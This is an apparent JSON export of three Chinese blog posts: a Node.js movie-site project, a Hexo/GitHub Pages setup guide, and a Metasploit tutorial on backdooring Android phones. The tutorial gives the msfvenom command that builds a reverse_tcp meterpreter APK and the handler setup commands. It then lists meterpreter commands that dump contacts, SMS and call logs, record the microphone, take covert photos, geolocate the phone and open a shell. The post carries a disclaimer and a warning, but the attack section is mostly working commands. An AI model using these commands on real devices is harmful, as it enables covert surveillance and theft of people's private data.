[{"title":"node开发电影站","date":"2016-12-20T08:45:59.000Z","path":"2016/12/20/node开发电影站/","text":"NodeJs + MongoDb + express4搭建的电影站简介 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学习nodejs也有一段时间了，本项目是一个非常简单的前端后端结合的nodejs项目，代码非常简洁明了，适合初识nodejs的同学了解和学习。另外感谢Scott大哥提供的学习资料素材。 数据库 MongoDb web框架 express4 前端 ejs 构建 grunt 前端 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 可以观看电影，查看电影详情，以及评论，还有分页搜索等。 后端 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对电影和分类进行添加和编辑以及删除，也可以添加删除用户等。同时接入了豆瓣电影的api，只需把豆瓣电影里的电影序号粘贴到豆瓣同步中，即可自动添加电影。需要用户的role大于50也就是管理员权限才可以访问后台 运行* npm install * grunt 首页 添加电影 电影列表 分页 搜索 项目地址https://github.com/Y00z/nodejs_movie","tags":[{"name":"开源","slug":"开源","permalink":"http://y00z.github.io/tags/开源/"},{"name":"nodejs","slug":"nodejs","permalink":"http://y00z.github.io/tags/nodejs/"}]},{"title":"msf渗透android并植入后门","date":"2016-12-19T07:32:08.000Z","path":"2016/12/19/msf渗透android并植入后门/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msf原名Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程 。团队合作，在Metasploit和综合报告提出了他们的发现。 环境 BackBox、kali linux、或者BackTrack(kali linux的前身) 一台安卓设备 环境不说太多介绍了，直接来实战。 生成payload装好环境后查看自己的ip 生成一个payload msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port R &gt; /root/apk.apk p 设置要使用的payload LHOST 设置用来接收反弹连接的主机 LPORT 设置用来接收反弹连接的端口 很小，才8kb如果用的BackTrack，里面的msf是旧版本的了。旧版本的生成payload是msfpayload。生成的apk放到手机上安装，安装完成后是这样的。 反弹shell 启动msf依次输入命令来设置paylod和反弹的ip以及反弹端口(ip和端口必须和生成payload时候的一致) * use exploit/multi/handler * set payload android/meterpreter/reverse_tcp * set LHOST 192.168.0.18 * set LPORT 2333 设置完毕后就可以输入 exploit 来执行攻击了 可以看到msf会一直在监听本机的2333端口，等待着目标连接上线然后我打开我们刚刚安装的打开后会连接到msf这样我们就拿到了手机的shell 控制指令 我来介绍几个有意思的指令。 * check_root #查看是否root * dump_calllog #下载通讯记录 * dump_contacts #下载联系人 * dump_sms #下载短信 * send_sms #发送短信 * record_mic #录音 * webcam_list #查看手机摄像头 * webcam_snap #拍照 * webcam_stream #连续拍照 * geolocate #获取目标地理位置 * upload #上传文件到手机 * download #下载手机上的文件 * shell #进入手机的bash shell check_root(检测root) 是root的设备 dump_contacts(下载联系人) 57个联系人 dump_sms(下载短信) 1271条短信 send_sms(发送短信) -d目标电话号码 -t 短信内容 record_mic(录音) -d 录音的秒数音频文件会自动保存在/var/www/html/目录下 webcam_list(检测摄像头) 2:前置摄像头1:后置摄像头 webcam_snap(拍照) -i 选择使用哪个摄像头拍照手机息屏的时候也可以拍照 webcam_stream(连续拍照) -i 指定摄像头 -d 拍照间隔(默认1800毫秒)使用目标手机摄像头连续拍照。会生成一个html文件,打开html，查看连续拍照照片 geolocate(获取地理位置) upload(上传文件到手机) download(下载文件到手机) shell(进入手机bash shell) ###最后 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这些操作都是可以在不用接触手机，而且手机也不会有任何提示下完成。所以同学们最好不要安装来历不明的app，后患无穷。","tags":[{"name":"安卓","slug":"安卓","permalink":"http://y00z.github.io/tags/安卓/"},{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"hexo+github搭建免费个人博客","date":"2016-12-14T17:06:22.000Z","path":"2016/12/15/hexo-github搭建免费个人博客/","text":"前言 一直想着有时间就把自己会的分享出来，可是一直拖啊拖，这次决心要share出来。 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hexo 是一个简单地、轻量地、基于Node的一个静态博客框架，可以方便的生成静态网页托 管在github和Heroku上，引用Hexo作者 @tommy351 的话：快速、简单且功能强大的 Node.js 博客框架。A fast, simple &amp; powerful blog framework, powered by Node.js. 一,搭建平台配置环境 安装Node（必须） 安装Git（必须） 申请github帐号（必须） 这三个就不用多说了。 配置github &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在github中创建仓库，仓库名必须和用户名对应 【your_user_name.github.io】，固定写法，如我们的github名叫zhangsan那么我们创建的仓库名是zhangsan.github.io。创建完毕后进入新建的仓库页面。右侧有一个setting 往下拉有个launch automatic page generator 输入标题和内容 完成后选择样式主题 选择完毕就可以点publish page我们的博客就已经完成了最后来查看效果https://zhangsan.github.io/ 二,hexo生成博客安装hexo* npm install -g hexo * npm install hexo-deployer-git --save 安装成功后输入命令 hexo init blogname ， 来初始化一个hexo博客,同时会新建blogname的文件夹，里面存放的就是我们博客的所有文件了 设置主题 主题: https://hexo.io/themes/ 找到我们需要的主题对应的github仓库，我们 cd blogname 切换到博客文件夹中 * git clone https://github.com/iissnan/hexo-theme-next.git themes/next 把hexo主题克隆到博客文件夹中。然后再打开博客主页中的_config.yml，找到theme,后面加上我们主题的名字如theme: next最后运行hexo s可以来查看效果了浏览器输入 http://localhost:4000查看效果。 三,同步github设置ssh key 首先进入到C:\\Users\\username\\.ssh文件夹中，把里面文件都删掉然后输入命令输入bash(配置git环境才有),进入bash shell再来依次输入命令生成ssh * ssh-keygen -t rsa -C your_github_email@163.com(提示输入密码不用理,直接回车) * ssh-agent –s * ssh-add ~/.ssh/id_rsa * eval `ssh-agent -s * ssh-add 如果输出了ssh目录呢,就说明生成成功了进入C:\\Users\\username\\.ssh目录,id_rsa.pub文件就是我们的key。 github设置ssh key 打开github的setting下面有一个SSH and GPG keys然后New ssh key，就可以输入标题和key了标题随意，key就是C:\\Users\\username\\.ssh\\id_rsa.pub中的内容，全部复制粘贴过去。Add SSH key 就ok了 测试 在bash shell中输入ssh git@github.com 注意：提示yes or no的话，一定要输入yes，千万别直接回车。如果回馈了我们github的用户名就说明连接成功了，可以直接部署到github上面了 hexo同步到github 打开blog文件夹中的_config.yml,在最后一行加上 * deploy: * type: git * repository: https://github.com/Y00z/y00z.github.io.git * branch: master repository中的地址是上面创建的仓库的地址 注意:type: 和repository: 以及branch:冒号后面有一个空格。最后hexo就可以同步到github上了每次同步到github的命令行 hexo clean &amp;&amp; hexo g &amp;&amp; hexo d最后户可以进入your_github_name.github.io 查看效果了。 其他更新 更新hexo： npm update -g hexo 更新主题： cd themes/你的主题 git pull 更新插件： npm update hexo命令 hexo new “postName” #新建文章 hexo new page “pageName” #新建页面 hexo generate #生成静态页面至public目录 hexo server #开启预览访问端口 hexo deploy #将.deploy目录部署到GitHub hexo clean #清除缓存","tags":[{"name":"hexo","slug":"hexo","permalink":"http://y00z.github.io/tags/hexo/"}]}]